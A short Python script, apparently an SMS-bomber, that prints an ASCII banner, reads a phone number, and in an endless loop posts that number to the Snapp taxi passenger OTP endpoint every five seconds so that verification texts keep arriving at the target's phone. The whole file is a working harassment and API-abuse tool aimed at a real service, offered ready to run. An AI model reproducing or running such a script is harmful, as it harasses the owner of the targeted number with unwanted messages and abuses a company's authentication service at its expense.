import time
import requests
from colorama import Fore
import os

os.system("clear")
print(Fore.RED + """ █████╗    ███╗   ███╗   ███╗   ███╗
██╔══██╗   ████╗ ████║   ████╗ ████║
███████║   ██╔████╔██║   ██╔████╔██║
██╔══██║   ██║╚██╔╝██║   ██║╚██╔╝██║
██║  ██║██╗██║ ╚═╝ ██║██╗██║ ╚═╝ ██║
╚═╝  ╚═╝╚═╝╚═╝     ╚═╝╚═╝╚═╝     ╚═""")

url = "https://app.snapp.taxi/api/api-passenger-oauth//v2/otp"
number = input(Fore.GREEN+ " Enter your number ? ")

while True:
    requests.post(url , data={"cellphone": number})
    print(" ersal shod !! ")
    time.sleep(5)